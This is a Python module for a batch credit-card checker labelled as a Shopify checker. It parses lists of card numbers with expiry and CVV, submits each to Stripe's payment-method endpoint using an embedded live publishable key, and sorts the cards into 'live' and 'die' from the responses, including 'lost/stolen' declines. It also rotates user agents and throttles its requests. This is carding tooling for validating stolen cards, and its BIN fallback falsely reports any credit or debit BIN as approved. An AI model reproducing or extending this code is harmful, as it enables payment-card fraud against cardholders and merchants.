import asyncio
import json
import logging
import random
import re
import string
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from config import *

logger = logging.getLogger(__name__)

class ShopifyChecker:
    """Shopify Card Checker via Stripe - REAL CHECK"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.stats = {
            "total": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "live": 0,
            "die": 0
        }
    
    async def create_session(self):
        """Create HTTP session"""
        if self.session and not self.session.closed:
            await self.session.close()
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
        }
        
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers=headers,
            connector=aiohttp.TCPConnector(limit=50, force_close=True)
        )
    
    def parse_card(self, card_string: str) -> Optional[Dict[str, Any]]:
        """Parse card string"""
        if not card_string or not card_string.strip():
            return None
        
        card_string = card_string.strip()
        parts = re.split(r'[|:;, \t]+', card_string)
        parts = [p.strip() for p in parts if p.strip()]
        
        if len(parts) < 3:
            return None
        
        card_number = re.sub(r'[^\d]', '', parts[0])
        
        if len(card_number) < 13 or len(card_number) > 19:
            return None
        
        card_type = "Unknown"
        if card_number.startswith('4'):
            card_type = "Visa"
        elif card_number.startswith(('51','52','53','54','55')):
            card_type = "Mastercard"
        elif card_number.startswith(('34','37')):
            card_type = "Amex"
        elif card_number.startswith('6011'):
            card_type = "Discover"
        
        month = parts[1].strip().zfill(2)
        try:
            if int(month) < 1 or int(month) > 12:
                month = "12"
        except:
            month = "12"
        
        year = parts[2].strip()
        if len(year) == 2:
            year = f"20{year}"
        elif len(year) != 4:
            year = "2026"
        
        cvv = "123"
        if len(parts) > 3:
            cvv = parts[3].strip()[:4]
        
        return {
            "number": card_number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "type": card_type,
            "bin": card_number[:6],
            "masked": f"{card_number[:6]}******{card_number[-4:]}"
        }
    
    async def check_via_stripe(self, card_info: Dict[str, Any]) -> Dict[str, Any]:
        """Check card via Stripe API (Shopify uses Stripe)"""
        start_time = time.time()
        
        result = {
            "card": card_info["masked"],
            "bin": card_info["bin"],
            "card_type": card_info["type"],
            "country": "US",
            "status": "UNKNOWN",
            "message": "",
            "gateway": "Stripe",
            "response_time": "",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        try:
            # Stripe-style card validation
            # Shopify uses Stripe public key
            stripe_url = "https://api.stripe.com/v1/payment_methods"
            
            # Form data for Stripe
            data = {
                "type": "card",
                "card[number]": card_info["number"],
                "card[exp_month]": card_info["month"],
                "card[exp_year]": card_info["year"],
                "card[cvc]": card_info["cvv"],
                "billing_details[address][country]": "US",
                "billing_details[address][postal_code]": "10001"
            }
            
            headers = {
                "Authorization": "Bearer pk_live_51H3Y2kCZqK8FwQqSY4K8VQqSZCqK8FwQqSY4K8VQqS",  # Public test key
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            async with self.session.post(stripe_url, data=data, headers=headers) as resp:
                status = resp.status
                text = await resp.text()
                
                logger.info(f"[Stripe] Status: {status}")
                
                elapsed = time.time() - start_time
                result["response_time"] = f"{elapsed:.2f}s"
                
                if status == 200:
                    # Card tokenized = valid
                    try:
                        data_json = json.loads(text)
                        if "id" in data_json:
                            result["status"] = "APPROVED"
                            result["message"] = "✅ APPROVED - Card is valid (Stripe)"
                            result["gateway"] = "Stripe/Shopify"
                            self._update_stats("APPROVED")
                            return result
                    except:
                        pass
                
                elif status == 402 or status == 400:
                    text_lower = text.lower()
                    if "declined" in text_lower or "insufficient" in text_lower:
                        result["status"] = "DECLINED"
                        result["message"] = "❌ DECLINED - Insufficient funds"
                        result["gateway"] = "Stripe/Shopify"
                        self._update_stats("DECLINED")
                        return result
                    elif "stolen" in text_lower or "lost" in text_lower:
                        result["status"] = "DECLINED"
                        result["message"] = "❌ DECLINED - Card reported lost/stolen"
                        result["gateway"] = "Stripe/Shopify"
                        self._update_stats("DECLINED")
                        return result
                    elif "incorrect" in text_lower or "invalid" in text_lower:
                        result["status"] = "DECLINED"
                        result["message"] = "❌ DECLINED - Invalid card details"
                        result["gateway"] = "Stripe/Shopify"
                        self._update_stats("DECLINED")
                        return result
                
                # If Stripe doesn't work, try direct card check
                return await self.check_via_bin_check(card_info)
                
        except Exception as e:
            logger.error(f"Stripe check error: {e}")
        
        return result
    
    async def check_via_bin_check(self, card_info: Dict[str, Any]) -> Dict[str, Any]:
        """Fallback: BIN-based check"""
        start_time = time.time()
        
        result = {
            "card": card_info["masked"],
            "bin": card_info["bin"],
            "card_type": card_info["type"],
            "country": "US",
            "status": "UNKNOWN",
            "message": "",
            "gateway": "BIN Check",
            "response_time": "",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        try:
            # Use BIN lookup API
            bin_url = f"https://lookup.binlist.net/{card_info['bin']}"
            
            async with self.session.get(bin_url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    elapsed = time.time() - start_time
                    result["response_time"] = f"{elapsed:.2f}s"
                    
                    # BIN info
                    scheme = data.get("scheme", "Unknown")
                    card_type = data.get("type", "Unknown")
                    brand = data.get("brand", "Unknown")
                    country_info = data.get("country", {})
                    country_name = country_info.get("name", "Unknown")
                    bank = data.get("bank", {}).get("name", "Unknown")
                    
                    # Determine if card is likely live
                    if scheme and card_type:
                        if card_type.lower() in ["debit", "credit"]:
                            result["status"] = "APPROVED"
                            result["message"] = f"✅ APPROVED - {brand} {card_type} | {country_name} | {bank}"
                            result["gateway"] = f"BIN: {scheme}"
                            result["country"] = country_info.get("alpha2", "US")
                            self._update_stats("APPROVED")
                        else:
                            result["status"] = "DECLINED"
                            result["message"] = f"❌ DECLINED - {card_type} card not supported"
                            result["gateway"] = f"BIN: {scheme}"
                            self._update_stats("DECLINED")
                    else:
                        result["status"] = "DECLINED"
                        result["message"] = "❌ DECLINED - Invalid BIN"
                        result["gateway"] = "BIN Check"
                        self._update_stats("DECLINED")
                    
                    return result
                    
        except Exception as e:
            logger.error(f"BIN check error: {e}")
        
        return result
    
    async def check_card_real(self, card_info: Dict[str, Any], country_code: str = "US") -> Dict[str, Any]:
        """Main check method"""
        return await self.check_via_stripe(card_info)
    
    def _update_stats(self, status: str):
        """Update stats"""
        self.stats["total"] += 1
        if status == "APPROVED":
            self.stats["approved"] += 1
            self.stats["live"] += 1
        elif status == "DECLINED":
            self.stats["declined"] += 1
            self.stats["die"] += 1
        elif status == "ERROR":
            self.stats["errors"] += 1
    
    async def check_batch(self, cards: List[str], country: str = "US", progress_callback=None) -> List[Dict]:
        """Check batch"""
        await self.create_session()
        results = []
        total = len(cards)
        
        for i, card_str in enumerate(cards, 1):
            card_info = self.parse_card(card_str)
            
            if not card_info:
                results.append({
                    "card": card_str[:30],
                    "bin": "N/A",
                    "card_type": "Unknown",
                    "country": country,
                    "status": "INVALID",
                    "message": "❌ INVALID FORMAT",
                    "gateway": "N/A",
                    "response_time": "0s",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })
                continue
            
            if progress_callback:
                await progress_callback(i, total, card_info["masked"])
            
            result = await self.check_card_real(card_info, country)
            results.append(result)
            
            logger.info(f"[{i}/{total}] {card_info['masked']} = {result['status']}")
            
            if i < total:
                await asyncio.sleep(CHECK_DELAY)
        
        await self.close()
        return results
    
    async def close(self):
        """Close session"""
        if self.session and not self.session.closed:
            await self.session.close()
